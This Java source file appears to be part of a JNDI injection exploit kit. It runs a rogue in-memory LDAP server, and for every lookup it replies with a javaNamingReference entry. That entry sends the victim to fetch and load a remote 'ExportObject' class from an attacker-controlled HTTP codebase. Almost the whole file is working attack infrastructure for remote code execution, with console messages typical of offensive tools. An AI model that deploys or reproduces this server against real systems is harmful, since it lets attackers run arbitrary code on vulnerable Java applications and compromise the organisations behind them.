package gds.els;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class MyLdapServer {

	private static final String LDAP_BASE = "dc=example,dc=com";

	public static void run(InetAddress host, int ldapPort, int httpPort) {

		try {
			InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
			config.setListenerConfigs(new InMemoryListenerConfig(
					"listen", 
					host, 
					ldapPort,
					ServerSocketFactory.getDefault(),
					SocketFactory.getDefault(),
					(SSLSocketFactory) SSLSocketFactory.getDefault()));

			config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL("http://" + host.getHostAddress() + ":" + httpPort + "/#ExportObject")));
			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
			ds.startListening();
			System.out.println("[+] LDAP server listening on " + host.getHostAddress() + ":"  + ldapPort); 

		}
		catch ( Exception e ) {
			System.out.println("[-] Exception: " + e.getMessage());
			e.printStackTrace();
			System.exit(1);
		}
	}

	private static class OperationInterceptor extends InMemoryOperationInterceptor {

		private URL codebase;

		public OperationInterceptor ( URL cb ) {
			this.codebase = cb;
		}

		@Override
		public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
			String base = result.getRequest().getBaseDN();
			Entry e = new Entry(base);
			try {
				sendResult(result, base, e);
			} catch ( Exception e1 ) {
				System.out.println("[-] Exception: " + e1.getMessage());
				e1.printStackTrace();
				System.exit(2);
			}
		}

		protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException, ParseException {

			URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
			System.out.println("[+] new LDAP request for " + base + " redirecting to " + turl);

			String cbstring = this.codebase.toString();
			int refPos = cbstring.indexOf('#');
			if ( refPos > 0 ) {
				cbstring = cbstring.substring(0, refPos);
			}

			e.addAttribute("javaClassName", "ExportObject");
			e.addAttribute("javaCodeBase", cbstring);
			e.addAttribute("objectClass", "javaNamingReference"); 
			e.addAttribute("javaFactory", this.codebase.getRef());
			result.sendSearchEntry(e);
			result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
		}
	}

}

